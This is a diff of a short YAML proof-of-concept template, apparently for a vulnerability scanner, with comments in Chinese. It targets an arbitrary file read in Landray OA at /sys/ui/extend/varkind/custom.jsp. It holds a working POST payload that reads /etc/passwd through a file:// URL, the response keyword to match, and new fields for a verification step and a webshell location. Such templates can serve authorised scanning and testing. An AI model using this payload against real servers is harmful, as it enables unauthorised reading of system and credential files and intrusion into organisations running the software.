@@ -2,17 +2,13 @@
 - name:
   - name: "LandrayOA_arbitrary_file_read"
 
-#种类：poc对应的是scan.py
-- type:
-  - type: "poc"
-
 #请求方式
 - method:
   - method: "post"
 
 #payload
 - payload:
-  - var: '{"body":{"file":"file:///etc/passwd"}}'
+  - payload: 'var={"body":{"file":"file:///etc/passwd"}}'
 #response包里的关键字
 - word:
   - word:
@@ -21,3 +17,11 @@
 #漏洞的位置
 - url:
   - url : "/sys/ui/extend/varkind/custom.jsp"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
